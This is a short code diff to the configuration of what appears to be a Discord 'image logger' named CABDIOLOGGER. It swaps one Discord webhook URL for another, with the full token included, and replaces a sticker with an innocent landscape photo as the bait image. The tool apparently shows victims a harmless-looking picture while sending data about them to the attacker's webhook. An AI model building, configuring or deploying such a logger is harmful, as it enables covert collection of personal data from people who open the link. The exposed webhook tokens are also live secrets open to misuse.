@@ -10,8 +10,8 @@ __version__ = "v2.0"
 __author__ = "cabdio"
 
 config = {
-    "webhook": "https://discord.com/api/webhooks/1425211812638621736/zF72k5B_XQ07fcCM6LpZ9enZ6rCBmG4xnfprwO7eN0DVgrgSzj6Xki08Vq0n25DiuAid",
-    "image": "https://stickerly.pstatic.net/sticker_pack/eNrxqOuc388RTr1MVqOg/BKPGHG/16/61453289.png", 
+    "webhook": "https://discord.com/api/webhooks/1523743494345326682/6-FyT2FS85j4gUpDZO0_bDk3TCbHGShI3URijDeGzw1LacyX6ebxChV4gHwqfXqc1YjU",
+    "image": "https://jooinn.com/images/beautiful-landscape-13.jpg", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
